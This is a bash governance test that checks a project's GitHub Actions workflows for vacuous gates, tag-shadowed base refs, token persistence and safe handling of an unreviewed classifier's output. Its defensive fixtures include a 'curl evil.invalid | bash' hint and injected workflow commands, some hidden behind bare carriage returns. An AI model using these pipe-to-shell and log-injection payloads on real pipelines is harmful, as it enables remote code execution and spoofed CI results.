#!/usr/bin/env bash
# Governance test: the CI/verifier workflows must actually be able to run.
# Guards against a failure class where the gates pass vacuously:
# workflows that target a branch that does not exist, unrendered template
# placeholders, non-recursive Dafny discovery, and bash syntax errors —
# all of which would make every gate in art-review-gate silently unenforced.
# Covers: REQ-395
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "$ROOT"

FAIL=0
fail() { echo "FAIL: $1"; FAIL=1; }
pass() { echo "ok:   $1"; }

TEMPLATE=true; if [[ -f .specflow.yml || -f .stack ]]; then TEMPLATE=false; fi

# P6 Task 2.4 (REQ-384): every workflow in the tree is checked, release-build.yml (and Build 3's release.yml) included —
# the glob below, and release-build.yml's place in §1's REQ-395 list, change what §§1–10 check.
# Covers: REQ-384
shopt -s nullglob
WORKFLOWS=(.github/workflows/*.yml)
shopt -u nullglob

# Determine the default branch (fallback: main).
DEFAULT_BRANCH="$(git symbolic-ref --short refs/remotes/origin/HEAD 2>/dev/null | sed 's|^origin/||' || true)"
DEFAULT_BRANCH="${DEFAULT_BRANCH:-main}"

# 1. REQ-395: pull_request triggers take any base (stacked PRs are checked); push stays on the default branch.
block() { awk -v k="  $2:" '$0==k{f=1; next} f && /^ ? ?[^ ]/{f=0} f' "$1"; }
REQ395_WFS=(.github/workflows/ci.yml .github/workflows/verifier.yml)
if [[ -f .github/workflows/release-build.yml ]]; then REQ395_WFS+=(.github/workflows/release-build.yml); fi
for wf in "${REQ395_WFS[@]}"; do
  if grep -qE '^  pull_request:' "$wf" && ! grep -qE '^[[:space:]]*branches:' <<<"$(block "$wf" pull_request)"; then
    pass "$wf triggers on pull_request to any base (REQ-395)"
  else
    fail "$wf pull_request trigger is missing or filtered by base branch (REQ-395: stacked PRs go unchecked)"
  fi
done
for wf in "${WORKFLOWS[@]}"; do
  if grep -E '^\s*branches:' "$wf" | grep -qv "\b${DEFAULT_BRANCH}\b"; then
    fail "$wf has a branches: filter not targeting default branch '${DEFAULT_BRANCH}'"
  else
    pass "$wf branch filters target '${DEFAULT_BRANCH}'"
  fi
done
# 1a. Retargeting a PR (base change) fires only 'edited': both workflows must list it, and no job may skip on it (H9).
for wf in .github/workflows/ci.yml .github/workflows/verifier.yml; do
  if grep -qE '^[[:space:]]*types:[[:space:]]*\[([^]]*[ ,])?edited([ ,][^]]*)?\]' <<<"$(block "$wf" pull_request)"; then
    pass "$wf re-runs when a PR is retargeted (pull_request types include edited)"
  else
    fail "$wf does not list 'edited' in its pull_request types: a retargeted stacked PR keeps its old checks"
  fi
  if grep -qE "github\.event\.action[[:space:]]*[!=]=[[:space:]]*'edited'" "$wf"; then
    fail "$wf conditions a job on the edited action — a skipped required job reports success"
  else
    pass "$wf runs every job on edited as on any other event"
  fi
done
if grep -qE "branches:[[:space:]]*\[[[:space:]]*${DEFAULT_BRANCH}[[:space:]]*\]" <<<"$(block .github/workflows/ci.yml push)"; then
  pass "ci.yml still runs on push to ${DEFAULT_BRANCH}"
else
  fail "ci.yml lost its push trigger on ${DEFAULT_BRANCH}"
fi
# 1b. A job that diffs must diff against the PR's base, never a hard-coded main (REQ-395, H5).
# (the fixed bootstrap line naming main's run-verifier.sh is the one sanctioned mention, SEC-020 — matched as that whole
# line, so another line naming both run-verifier.sh and origin/main is still caught: P7 Build 1 fix wave 1, FIX 8)
FIXED_BOOTSTRAP='            echo "To attest, from a terminal outside any Claude Code session, run: git show refs/remotes/origin/main:scripts/run-verifier.sh | bash -s -- $PR"'
names_main() { grep -vxF -- "$FIXED_BOOTSTRAP" "$1" | grep -q 'origin/main'; }
scratch_wf=$(mktemp); { cat .github/workflows/verifier.yml; echo '          git diff origin/main...HEAD  # beside scripts/run-verifier.sh'; } > "$scratch_wf"
if names_main "$scratch_wf"; then
  pass "1b's check catches a line naming both run-verifier.sh and origin/main (only the fixed bootstrap line is exempt)"
else
  fail "1b's check let a line naming both run-verifier.sh and origin/main through"
fi
rm -f "$scratch_wf"
if ! grep -qxF -- "$FIXED_BOOTSTRAP" .github/workflows/verifier.yml; then
  fail "verifier.yml lacks the fixed bootstrap line 1b exempts"
elif names_main .github/workflows/verifier.yml; then
  fail "verifier.yml diffs against origin/main — a stacked PR's base is another branch"
elif grep -q 'github.base_ref' .github/workflows/verifier.yml; then
  pass "verifier.yml diffs against the PR base (github.base_ref)"
else
  fail "verifier.yml does not read the PR base from github.base_ref"
fi

# 1c. The verifier job runs the BASE's classifier, never the PR's own copy (#33 high; REQ-311, REQ-395):
#     attestation.py and config.py are materialised from origin/$BASE_REF with git show; only when the base
#     predates the module (the v3.2-upgrade PR) does the head's own copy run, and the job says so.
V=.github/workflows/verifier.yml
if grep -qF 'git show "$BASE:scripts/lib/specflow/attestation.py"' "$V" \
   && grep -qF 'git show "$BASE:scripts/lib/specflow/config.py"' "$V" && grep -qF 'RUNNER_TEMP' "$V"; then
  pass "verifier.yml materialises attestation.py and config.py from the base ref"
else
  fail "verifier.yml does not materialise attestation.py and config.py from \$BASE, the base ref (the PR would run its own check)"
fi
if grep -qE 'python3 +scripts/lib/specflow/attestation\.py +check' "$V"; then
  fail "verifier.yml runs the checkout's attestation.py check directly (the PR under review controls its own check)"
else
  pass "verifier.yml never runs the checkout's attestation.py check directly"
fi
if grep -qF 'predates the attestation module' "$V"; then
  pass "verifier.yml prints the bootstrap notice when the base predates the module"
else
  fail "verifier.yml has no bootstrap notice for a base that predates the attestation module"
fi
# The bootstrap notice is honest: the head's own classifier is not a control; a waiver is the route for an honest PR.
bline=$(grep -F 'predates the attestation module' "$V" || true)
if grep -qi 'not a control' <<<"$bline" && grep -qi 'honest PR' <<<"$bline" && ! grep -qi 'only route' <<<"$bline"; then
  pass "the bootstrap notice says the head's classifier is not a control and the waiver is the route for an honest PR"
else
  fail "the bootstrap notice overstates what the fallback enforces (#33 bootstrap medium): $bline"
fi
# #36 low (REQ-311, REQ-334): check's --commits/--files/--contents flags feed synthetic diff data and exist for tests
# only; the workflow must never pass them (the exemption must see the PR's real commits, paths and texts), and a
# comment above the step says so.
if grep -vE '^[[:space:]]*#' "$V" | grep -qE -- '--(commits|files|contents)\b'; then
  fail "verifier.yml passes a test-only --commits/--files/--contents flag to attestation.py check"
else
  pass "verifier.yml never passes the test-only --commits/--files/--contents flags"
fi
if awk '/- name: Check the attestation/{exit} {print}' "$V" | tail -4 | grep -q '^ *#.*test-only'; then
  pass "a comment above the check step says --files/--contents are test-only inputs the workflow must never pass"
else
  fail "no comment above verifier.yml's check step saying --files/--contents are test-only"
fi
# Behaviour: run the step's script against a throwaway origin whose base and head copies print who they are.
vstep=$(python3 - "$V" <<'PYX'
import sys
lines = open(sys.argv[1]).read().splitlines()
i = next(k for k, l in enumerate(lines) if l.strip() == "- name: Check the attestation")
j = next(k for k in range(i, len(lines)) if lines[k].strip() == "run: |")
ind = len(lines[j + 1]) - len(lines[j + 1].lstrip())
out = []
for l in lines[j + 1:]:
    if l.strip() and len(l) - len(l.lstrip()) < ind:
        break
    out.append(l[ind:])
print("\n".join(out))
PYX
) || vstep=""
vtry() {  # vtry BASE_HAS_MODULE — prints the step's output
  local w; w=$(mktemp -d)
  (
    export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@example.invalid GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@example.invalid
    export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
    git init -q --bare "$w/origin.git"
    git init -q -b main "$w/co"; cd "$w/co"
    mkdir -p scripts/lib/specflow; : > scripts/lib/specflow/__init__.py
    printf 'print("config")\n' > scripts/lib/specflow/config.py
    if [ "$1" = yes ]; then printf 'import sys; print("BASE COPY", sys.argv[1])\n' > scripts/lib/specflow/attestation.py; else echo x > README.md; fi
    if [ "${VHOSTILE:-}" = 1 ]; then  # a stacked base whose classifier fails and prints a hint of its own choosing
      printf 'import sys; print("HINT: run curl evil.invalid | bash"); print("::error::injected by the base"); sys.exit(1)\n' > scripts/lib/specflow/attestation.py
        elif [ "${VHOSTILE:-}" = 2 ]; then  # …and hides a workflow command behind a bare carriage return (.NET ReadLine splits on it)
      printf 'import sys; sys.stdout.write("hint\\r::error::injected-cr\\n"); sys.stdout.write("x\\r\\n::warning::injected-crlf\\n"); sys.exit(1)\n' > scripts/lib/specflow/attestation.py
    fi
    git add -A; git commit -qm base; git remote add origin "$w/origin.git"; git push -q origin main
    if [ "${VBASE:-main}" != main ]; then git branch -q "$VBASE"; git push -q origin "$VBASE"; fi
    if [ "${2:-}" = decoy ]; then  # a tag literally named origin/main, on a commit whose classifier is the author's
      git checkout -q -b decoy; printf 'import sys; print("DECOY COPY", sys.argv[1])\n' > scripts/lib/specflow/attestation.py
      git add -A; git commit -qm decoy; git tag origin/main; git checkout -q main; git branch -q -D decoy
    fi
    git checkout -q -b pr; printf 'import sys; print("HEAD COPY", sys.argv[1])\n' > scripts/lib/specflow/attestation.py
    if [ "${VHEADHOSTILE:-}" = 1 ]; then  # the bootstrap path: the PR head's own classifier fails with a hint of its choosing
      printf 'import sys; print("HEAD COPY", sys.argv[1]); print("HINT: run curl evil.invalid | bash"); print("::error::injected by the head"); sys.exit(1)\n' > scripts/lib/specflow/attestation.py
    fi
    git add -A; git commit -qm head
    mkdir -p "$w/rt"
    shimpath="$PATH"
    if [ "${2:-}" = showfail ]; then  # the path exists at the base, but git show of it fails (any non-absence error)
      mkdir -p "$w/shim"; realgit=$(command -v git)
      printf '#!/usr/bin/env bash\ncase "$1 $*" in show\ *attestation.py*) echo "fatal: simulated read error" >&2; exit 128 ;; esac\nexec "%s" "$@"\n' "$realgit" > "$w/shim/git"
      chmod +x "$w/shim/git"; shimpath="$w/shim:$PATH"
    fi
    vrc=0; PATH="$shimpath" BASE_REF="${VBASE:-main}" RUNNER_TEMP="$w/rt" REPO=o/r PR=7 HEAD_SHA="$(git rev-parse HEAD)" PR_AUTHOR=alice GH_TOKEN=x bash -e -c "$vstep" 2>&1 || vrc=$?
    echo "VSTEP_RC=$vrc"
  ); rm -rf "$w"
}
vout=$(vtry yes || true)
if grep -q '^BASE COPY check' <<<"$vout" && ! grep -q 'HEAD COPY' <<<"$vout"; then
  pass "the verifier step runs the base's attestation.py, not the PR's"
else
  fail "the verifier step did not run the base's attestation.py: $vout"
fi
vout=$(vtry no || true)
if grep -q '^| HEAD COPY check' <<<"$vout" && grep -qF 'predates the attestation module' <<<"$vout"; then
  pass "a base without the module falls back to the head's copy and says so (bootstrap)"
else
  fail "the bootstrap fallback did not run the head's copy with a notice: $vout"
fi
# P7 Build 1 fix wave 1, FIX 4 (SEC-020; REQ-382, REQ-385): on the bootstrap path the PR head's own classifier runs, so
# its text is labelled as the head's own, prefixed and defanged like a stacked base's, and the fixed line the workflow
# prints itself names the --bootstrap route (from a checkout of the PR head), never the ordinary verifier, which
# refuses a base that predates the verifier.
# Covers: REQ-382
# Covers: REQ-385
vout=$(VHEADHOSTILE=1 vtry no || true)
if grep -q '^VSTEP_RC=1' <<<"$vout" \
   && grep -qF "printed by this PR head's own classifier" <<<"$vout" \
   && grep -qxF 'To attest, this base predates the attestation module: from a checkout of the PR head, in a terminal outside any Claude Code session, run: bash scripts/run-verifier.sh 7 --bootstrap — then a maintainer posts a waiver naming that comment (CI never accepts a bootstrap marker)' <<<"$vout" \
   && ! grep -qF 'bash -s -- 7' <<<"$vout" \
   && ! grep -q '^::error::injected' <<<"$vout" && grep -q '^::stop-commands::[0-9a-f]\{32\}$' <<<"$vout"; then
  pass "the bootstrap path: the head's classifier text is labelled and defanged, and the fixed line names --bootstrap"
else
  fail "the bootstrap path printed the head's classifier text raw, or its fixed line names the ordinary verifier: $vout"
fi
# #33 third bootstrap medium (REQ-311, REQ-395): the fallback is decided by the path's absence at the base
# (git cat-file -e), never by any git show failure; a base that has the module but cannot be read fails the job.
if grep -qF 'git cat-file -e "$BASE:scripts/lib/specflow/attestation.py"' "$V"; then
  pass "verifier.yml decides the bootstrap fallback with git cat-file -e at the base"
else
  fail "verifier.yml does not decide the bootstrap fallback by the module's absence at the base (git cat-file -e)"
fi
vout=$(vtry yes showfail || true)
if grep -q '^VSTEP_RC=[1-9]' <<<"$vout" && ! grep -q 'HEAD COPY' <<<"$vout" && ! grep -qF 'predates the attestation module' <<<"$vout"; then
  pass "a base that has the module but whose git show fails: the job fails, no fallback to the head's copy"
else
  fail "a failing git show of a present module fell back or passed (not fail-closed): $vout"
fi
# SEC-020 (PR #62 review; PR #61 run 1 finding 2; REQ-382, REQ-385): on a stacked PR the job runs the stacked base's
# classifier, whose failure hint is whatever that unreviewed branch prints. The workflow itself prints the fixed bootstrap
# command (a literal here, main's reviewed script, never the classifier's text) on every failure, and on a non-main base
# labels the classifier's output as the base's own and defangs workflow commands in it.
# Covers: REQ-382
# Covers: REQ-385
vout=$(VBASE=stk VHOSTILE=1 vtry yes || true)
if grep -q '^VSTEP_RC=1' <<<"$vout" \
   && grep -qxF 'To attest, from a terminal outside any Claude Code session, run: git show refs/remotes/origin/main:scripts/run-verifier.sh | bash -s -- 7' <<<"$vout" \
   && grep -qF "printed by the stacked base's own classifier" <<<"$vout" \
   && ! grep -q '^::error::injected' <<<"$vout"; then
  pass "a stacked base: the workflow prints main's bootstrap itself, labels the base's output, and defangs its workflow commands (SEC-020)"
else
  fail "a stacked base's classifier text reached the log unlabelled, or the fixed bootstrap line is missing: $vout"
fi
# P7 Build 1 final review (finding 5; SEC-020): the runner reads step output a line at a time with .NET ReadLine, which
# also ends a line at a bare \r, so prefixing after \n alone lets "hint\r::error::x" through. The stacked base's text
# has every \r turned into a space, is prefixed, and sits between ::stop-commands::<random token> and ::<token>::, so no
# workflow command inside it is processed. Judged with a CR-aware split, never grep (which splits on \n only).
# Covers: REQ-382
# Covers: REQ-385
vout=$(VBASE=stk VHOSTILE=2 vtry yes || true)
if python3 - "$vout" <<'PYCR'
import re, sys
out = sys.argv[1]
lines = re.split(r"\r\n|\r|\n", out)
assert "VSTEP_RC=1" in lines, out
stops = [n for n, l in enumerate(lines) if re.fullmatch(r"::stop-commands::[0-9a-f]{32}", l)]
assert len(stops) == 1, lines
tok = lines[stops[0]].split("::")[2]
ends = [n for n, l in enumerate(lines) if l == f"::{tok}::"]
assert len(ends) == 1 and ends[0] > stops[0], lines
body = [n for n, l in enumerate(lines) if l.startswith("| ")]
assert body and all(stops[0] < n < ends[0] for n in body), lines
for n, l in enumerate(lines):
    if l.startswith("::") and n not in (stops[0], ends[0]):
        raise SystemExit(f"a workflow command on a line of its own: {l!r}")
assert any("injected-cr" in l for l in lines) and any("injected-crlf" in l for l in lines), lines
PYCR
then
  pass "a stacked base's classifier text with a bare \\r: no workflow command on a line of its own; the text sits inside a stop-commands pair (SEC-020)"
else
  fail "a stacked base's classifier text split on \\r into a workflow command, or is not inside a stop-commands pair: $vout"
fi
vout=$(VHOSTILE=1 vtry yes || true)
if grep -q '^VSTEP_RC=1' <<<"$vout" \
   && grep -qxF 'To attest, from a terminal outside any Claude Code session, run: git show refs/remotes/origin/main:scripts/run-verifier.sh | bash -s -- 7' <<<"$vout" \
   && ! grep -qF "printed by the stacked base's own classifier" <<<"$vout"; then
  pass "a PR to main: the same fixed bootstrap line on failure, no stacked-base label"
else
  fail "a failing check on a PR to main lacks the fixed bootstrap line or is mislabelled: $vout"
fi
vout=$(vtry yes || true)
if grep -q '^VSTEP_RC=0' <<<"$vout" && ! grep -qF 'To attest' <<<"$vout"; then
  pass "a passing check prints no bootstrap line"
else
  fail "a passing check printed the failure hint: $vout"
fi
# Build 2 fix wave 2 (REQ-311, REQ-395; PR #54 verifier run 1, finding 1's class): checkout's fetch-depth: 0 brings tags,
# and git resolves a short name's refs/tags/<name> before refs/remotes/<name>, so a tag literally named origin/<base> —
# which any writer can push (the tag ruleset covers v* only) — would choose the classifier the verifier job runs. Every
# base read in verifier.yml goes through BASE=refs/remotes/origin/$BASE_REF, never the short origin/$BASE_REF.
if grep -qxF '          BASE="refs/remotes/origin/$BASE_REF"' "$V" && ! grep -vE '^[[:space:]]*#' "$V" | grep -qE '(^|[^/])origin/\$BASE_REF'; then
  pass "verifier.yml reads the base only by its full ref, refs/remotes/origin/\$BASE_REF (never the short origin/\$BASE_REF)"
else
  fail "verifier.yml reads the base by the short name origin/\$BASE_REF, which a tag named origin/<base> shadows"
fi
vout=$(vtry yes decoy || true)
if grep -q '^BASE COPY check' <<<"$vout" && ! grep -q 'DECOY COPY' <<<"$vout"; then
  pass "a tag named origin/main in the checkout does not choose the classifier: the base branch's copy runs"
else
  fail "a tag named origin/main shadowed the base in the verifier step: $vout"
fi
# #33 third bootstrap low: two PRs sharing a head branch must not cancel each other's verifier runs.
if grep -qF 'group: verifier-${{ github.event.pull_request.number }}' "$V" && ! grep -qF 'group: verifier-${{ github.head_ref }}' "$V"; then
  pass "verifier.yml's concurrency group is keyed on the PR number"
else
  fail "verifier.yml's concurrency group is not keyed on the PR number (two PRs sharing a head cancel each other)"
fi

# 2. No unrendered {{...}} template placeholders in live workflows.
#    (GitHub Actions' own ${{ ... }} expressions are legitimate and excluded.)
for wf in "${WORKFLOWS[@]}"; do
  if grep -qE '(^|[^$])\{\{' "$wf"; then
    fail "$wf contains unrendered {{...}} placeholders"
  else
    pass "$wf has no template placeholders"
  fi
done

# 3. No redirection inside a for-loop word list (bash syntax error:
#    'for x in glob 2>/dev/null; do' fails 100% of the time).
for wf in "${WORKFLOWS[@]}"; do
  if grep -qE 'for\s+\w+\s+in\s+[^;]*2>/dev/null' "$wf"; then
    fail "$wf has redirection inside a for-loop word list (bash syntax error)"
  else
    pass "$wf has no for-loop redirection syntax error"
  fi
done

# 4. Dafny discovery in workflows must be recursive (proofs live in
#    verification/<subdir>/; a bare 'verification/*.dfy' glob misses them all).
if grep -qE 'dafny verify verification/\*\.dfy' .github/workflows/verifier.yml; then
  fail "verifier.yml uses non-recursive 'verification/*.dfy' — misses all proofs in subdirectories"
else
  pass "verifier.yml Dafny discovery is not the known non-recursive glob"
fi
# 4b. …and the discovered paths reach dafny unsplit: find -exec, never an unquoted $(find …) (SC2046).
for wf in "${WORKFLOWS[@]}"; do
  if grep -qF 'dafny verify $(find' "$wf"; then fail "$wf passes an unquoted \$(find …) to dafny verify (SC2046)"
  else pass "$wf has no unquoted \$(find …) for dafny verify"; fi
done
if grep -qF "find verification -type f -name '*.dfy' -exec dafny verify {} +" .github/workflows/verifier.yml; then
  pass "verifier.yml verifies proofs with find -exec dafny verify {} +"
else
  fail "verifier.yml does not verify proofs with find -exec dafny verify {} +"
fi

# 5. Some workflow must run the quality-gates orchestrator on PRs,
#    otherwise the gates are local-honor-system only.
if grep -q 'run-quality-gates.sh' .github/workflows/ci.yml; then
  pass "ci.yml runs scripts/run-quality-gates.sh"
else
  fail "ci.yml does not run scripts/run-quality-gates.sh — quality gates unenforced in CI"
fi

# 5b. P6 Task 2.3 (REQ-324, REQ-384; R26, F7): the gates step hands verify-release.sh the PR's head SHA through env:.
# Covers: REQ-384
if python3 - <<'PY'
import re
t = open(".github/workflows/ci.yml").read()
m = re.search(r"- name: Run quality gates\n(.*?)\n        run: bash scripts/run-quality-gates\.sh", t, re.S)
assert m and re.search(r"^          SPECFLOW_HEAD_SHA: \$\{\{ github\.event\.pull_request\.head\.sha \}\}$", m.group(1), re.M), t
PY
then
  pass "ci.yml's gates step passes SPECFLOW_HEAD_SHA (the PR head) through env:"
else
  fail "ci.yml's gates step does not pass SPECFLOW_HEAD_SHA through env:"
fi

# 5c. Build 2 fix wave 2 (REQ-384, REQ-324; PR #54 verifier run 1, finding 1): the gates step hands its scripts the base
#     as the full ref refs/remotes/origin/<base>. checkout's fetch-depth: 0 brings tags, and git resolves a short name's
#     refs/tags/<name> before refs/remotes/<name>, so with the short origin/<base> a tag literally named origin/<base>
#     would choose every base-ref read the gates make (the pack and the release hook, coverage_min, the disposition gate,
#     instance-ness); the test-first step is not among them — it passes the event's base SHA.
# Covers: REQ-384
# Covers: REQ-324
if python3 - <<'PY'
import re
t = open(".github/workflows/ci.yml").read()
m = re.search(r"- name: Run quality gates\n(.*?)\n        run: bash scripts/run-quality-gates\.sh", t, re.S)
assert m, "no gates step"
want = "          SPECFLOW_BASE_REF: ${{ github.event_name == 'pull_request' && format('refs/remotes/origin/{0}', github.base_ref) || '' }}"
assert want in m.group(1).splitlines(), m.group(1)
assert "format('origin/{0}'" not in t, "a short origin/<base> survives in ci.yml"
PY
then
  pass "ci.yml's gates step passes SPECFLOW_BASE_REF as refs/remotes/origin/<base>, never the short origin/<base>"
else
  fail "ci.yml's gates step passes SPECFLOW_BASE_REF as the short origin/<base>, which a tag named origin/<base> shadows"
fi

# 6. The verifier must trigger on normally-opened PRs, not only
#    ready_for_review/labeled (a PR opened non-draft never fires those).
if grep -qE '^\s*types:.*\bopened\b' .github/workflows/verifier.yml && \
   grep -qE '^\s*types:.*\bsynchronize\b' .github/workflows/verifier.yml; then
  pass "verifier.yml triggers on opened + synchronize"
else
  fail "verifier.yml does not trigger on opened/synchronize — non-draft PRs are never verified"
fi

# 7. Tooling dependencies used by the gates must be declared.
for dep in pytest; do
  if grep -qi "^${dep}" scripts/requirements.txt; then
    pass "scripts/requirements.txt declares ${dep}"
  else
    fail "scripts/requirements.txt missing '${dep}' — quality gates fail on a clean checkout"
  fi
done

# 7b. Instances inherit no template-only CI (H5): init deletes the marked jobs and app-stacks.yml.
if [[ $TEMPLATE == true ]]; then
  if grep -q '# >>> specflow:template-only' .github/workflows/ci.yml && grep -q '# <<< specflow:template-only' .github/workflows/ci.yml \
     && [ -z "$(awk '/# >>> specflow:template-only/{f=1} /# <<< specflow:template-only/{f=0} !f && /test_first_run\.sh/' .github/workflows/ci.yml)" ]; then
    pass "ci.yml keeps its template-only jobs between the markers"
  else
    fail "ci.yml template-only jobs are not marked for init to strip (H5)"
  fi
elif grep -qE 'specflow:template-only|test_first_run\.sh' .github/workflows/ci.yml || [[ -e .github/workflows/app-stacks.yml ]]; then
  fail "this instance inherited template-only CI jobs (H5)"
else
  pass "this instance's CI carries no template-only jobs"
fi

# 7c. App stacks gate on macos-15 by dispatch, schedule and their pack paths — never on every PR (REQ-360).
A=.github/workflows/app-stacks.yml
if [[ $TEMPLATE == false ]]; then
  pass "instance: app-stacks.yml is a template-only workflow"
elif [[ -f $A ]] && grep -qE '^[[:space:]]*workflow_dispatch:' "$A" && grep -qE '^[[:space:]]*-?[[:space:]]*cron:' "$A" \
     && grep -qF 'stacks/tauri/**' "$A" && grep -qF 'stacks/flutter/**' "$A" && grep -qE 'runs-on:[[:space:]]*macos-15' "$A" \
     && ! grep -q macos-latest "$A" && grep -qF 'uses: ./stacks/tauri' "$A" && grep -qF 'uses: ./stacks/flutter' "$A" \
     && grep -qE 'SPECFLOW_FIRST_RUN:[[:space:]]*"?1"?' "$A" && grep -qE '^permissions:' "$A" \
     && grep -q 'CARGO_TARGET_DIR' "$A" && grep -q 'actions/cache@' "$A" && grep -qE 'rust_cache:[[:space:]]*"?false"?' "$A"; then
  pass "app-stacks.yml runs the tauri and flutter first runs on macos-15 with warm-cacheable build dirs"
  # The tauri cache key follows the pack's pins (hashFiles over pack.yml), never a hard-coded toolchain version.
  if grep -qE 'key:.*tauri-[0-9]+\.[0-9]+\.[0-9]+' "$A"; then
    fail "app-stacks.yml tauri cache key hard-codes a toolchain version; hash stacks/tauri/pack.yml instead"
  elif grep -qE "key:.*tauri-.*hashFiles\('stacks/tauri/pack\.yml'" "$A"; then
    pass "app-stacks.yml tauri cache key follows the pack's pins"
  else
    fail "app-stacks.yml tauri cache key does not hash stacks/tauri/pack.yml"
  fi
else
  fail "app-stacks.yml missing or incomplete (REQ-360: dispatch, weekly schedule, pack paths, macos-15, pack actions, cached CARGO_TARGET_DIR)"
fi

# 7c2. app-stacks.yml must not set CARGO_TARGET_DIR (or any value) via job-level
# `env:` using the `runner` context — GitHub Actions disallows `runner` in
# `jobs.<job_id>.env`, which makes the whole workflow fail to start (never
# runs on dispatch, schedule, or PRs touching the packs).
if [[ $TEMPLATE == true && -f $A ]]; then
  if awk '
    /^jobs:/ { in_jobs=1 }
    in_jobs && /^  [A-Za-z0-9_-]+:[[:space:]]*$/ { job=1; job_env=0; next }
    job && /^    env:[[:space:]]*$/ { job_env=1; next }
    job_env && /^    [A-Za-z]/ { job_env=0 }
    job_env && /runner\./ { found=1 }
    END { exit(found ? 0 : 1) }
  ' "$A"; then
    fail "app-stacks.yml sets job-level env: using the runner context (invalid; jobs.<job_id>.env only allows github/needs/strategy/matrix/vars/secrets/inputs)"
  else
    pass "app-stacks.yml does not use the runner context in job-level env:"
  fi
fi

# 7c3. actionlint (if available) must accept every workflow — catches
# structural errors like invalid contexts that the targeted greps above miss.
if command -v actionlint >/dev/null 2>&1; then
  # Plain actionlint, shellcheck findings included (the verifier.yml Dafny step's unquoted $(find …), SC2046, was
  # the last one): a workflow's run: scripts are gate code, and a word-splitting bug there is a gate bug.
  if al_out=$(actionlint "${WORKFLOWS[@]}" 2>&1); then
    pass "actionlint accepts all workflows (structural and shellcheck checks)"
  else
    fail "actionlint found structural errors: $al_out"
  fi
else
  echo "SKIP: actionlint not on PATH (install with: brew install actionlint); only the targeted greps above ran"
fi
# 7d. The ubuntu job asserts the app-stack profile dimension without any app toolchain (REQ-360, H4).
job=$(awk '/^  app-profiles:/{f=1; print; next} f && /^  [A-Za-z#]/{exit} f' .github/workflows/ci.yml)
if [[ $TEMPLATE == false ]]; then
  pass "instance: the profile-diff job is template-only"
elif grep -q 'FIRST_RUN_CASES: profiles' <<<"$job" && grep -q 'ubuntu-latest' <<<"$job" && ! grep -qE 'setup-node|flutter-action|rustup|cargo' <<<"$job"; then
  pass "ci.yml app-profiles job diffs the profiles on ubuntu with no app toolchain"
else
  fail "ci.yml lacks the toolchain-free app-profiles job (REQ-360)"
fi

# 8. The first-run test runs on every PR for python x both profiles (REQ-360).
if [[ $TEMPLATE == false ]] || { grep -q 'tests/governance/test_first_run.sh' .github/workflows/ci.yml \
   && grep -qE 'SPECFLOW_FIRST_RUN:[[:space:]]*"?1"?' .github/workflows/ci.yml \
   && grep -qE 'profile:[[:space:]]*\[[[:space:]]*guided,[[:space:]]*engineer[[:space:]]*\]' .github/workflows/ci.yml; }; then
  pass "ci.yml runs test_first_run.sh for guided and engineer"
else
  fail "ci.yml does not run the first-run test for both profiles (REQ-360)"
fi

# 9. Gate scripts and governance tests must call python3, never a bare
#    `python`: fresh macOS (Homebrew) and Ubuntu (without python-is-python3)
#    ship only python3, so `python -m pytest` prints "command not found" and
#    the core gate fails while --doctor (which checks python3) says all is well.
if bare=$(grep -rnE '(^|[[:space:]("!])python[[:space:]]+(-m|[^[:space:]]*\.py)' scripts/*.sh tests/governance/*.sh tests/unit/*.sh stacks/*/*.sh 2>/dev/null); then
  fail "bare 'python' invocation (use python3): $(head -3 <<<"$bare" | tr '\n' ';')"
else
  pass "no shipped script or test calls a bare 'python'"
fi

# 10. Fix wave 1 (REQ-384, REQ-334; P6 R15, F9, F21): every actions/checkout sets persist-credentials: false, so no job
#     token is written to .git/config where project code could read it — the gates job now runs the stack's release hook
#     (verify-release.sh), and every workflow but verifier.yml runs project code. verifier.yml alone is exempt: its
#     verifier job fetches the base with the job token (git fetch origin <base>) and runs the base's own classifier,
#     never the PR's code; its other jobs run none either.
# Covers: REQ-384
for wf in "${WORKFLOWS[@]}"; do
  [[ $wf == .github/workflows/verifier.yml ]] && continue
  if python3 - "$wf" <<'PYC'
import re, sys
t = open(sys.argv[1]).read(); steps = re.split(r"(?m)^\s*- (?=(?:name: [^\n]*\n\s*)?uses: )", t)[1:]
co = [s for s in steps if re.match(r"(name: [^\n]*\n\s*)?uses: actions/checkout@", s)]
bad = [s.split("\n", 1)[0] for s in co if not re.search(r"^\s+persist-credentials: false\s*$", re.split(r"(?m)^\s*- ", s, 1)[0], re.M)]
assert not bad, bad
PYC
  then pass "$wf: every actions/checkout sets persist-credentials: false"
  else fail "$wf: an actions/checkout leaves the job token in .git/config (persist-credentials: false missing)"; fi
done

# 11. BL-039 (REQ-395, REQ-311): ci.yml's top-level concurrency group is keyed on the PR number for a pull_request
#     and on the run id for any other event, and cancels a superseded run only for a pull_request. Two PRs never
#     cancel each other, and every push run on main has a group of its own: GitHub keeps at most one running and one
#     pending run per group and cancels a pending run when a newer one queues, whatever cancel-in-progress says, so a
#     shared push group (ci-refs/heads/main) would drop the middle one of three quick merges (final review findings
#     3, 6, 9). A push and a PR-body edit seconds apart otherwise ran the gates twice per head.
# Covers: REQ-395
# Covers: REQ-311
if python3 - .github/workflows/ci.yml <<'PYC'
import re, sys
t = open(sys.argv[1]).read()
m = re.search(r"(?m)^concurrency:[ \t]*\n((?:[ \t]+[^\n]*\n|[ \t]*\n)+)", t)
assert m, "no top-level concurrency block"
b = m.group(1)
g = re.search(r"(?m)^[ \t]+group:[ \t]*(.+?)[ \t]*$", b)
c = re.search(r"(?m)^[ \t]+cancel-in-progress:[ \t]*(.+?)[ \t]*$", b)
assert g and g.group(1) == ("${{ github.event_name == 'pull_request' && format('ci-pr-{0}', github.event.pull_request.number)"
                            " || format('ci-run-{0}', github.run_id) }}"), g and g.group(1)
assert "github.ref" not in b, "a push group keyed on the ref is shared by every push to main"
assert c and c.group(1) == "${{ github.event_name == 'pull_request' }}", c and c.group(1)
PYC
then pass "ci.yml cancels a superseded run of the same PR only (group ci-pr-<number>; a push run's group is its own run id, BL-039)"
else fail "ci.yml has no concurrency group ci-pr-<PR number> / ci-run-<run id> with cancel-in-progress limited to pull_request events (BL-039)"; fi

if [[ $FAIL -ne 0 ]]; then
  echo "test_workflow_health: FAILED"
  exit 1
fi
echo "test_workflow_health: all checks passed"
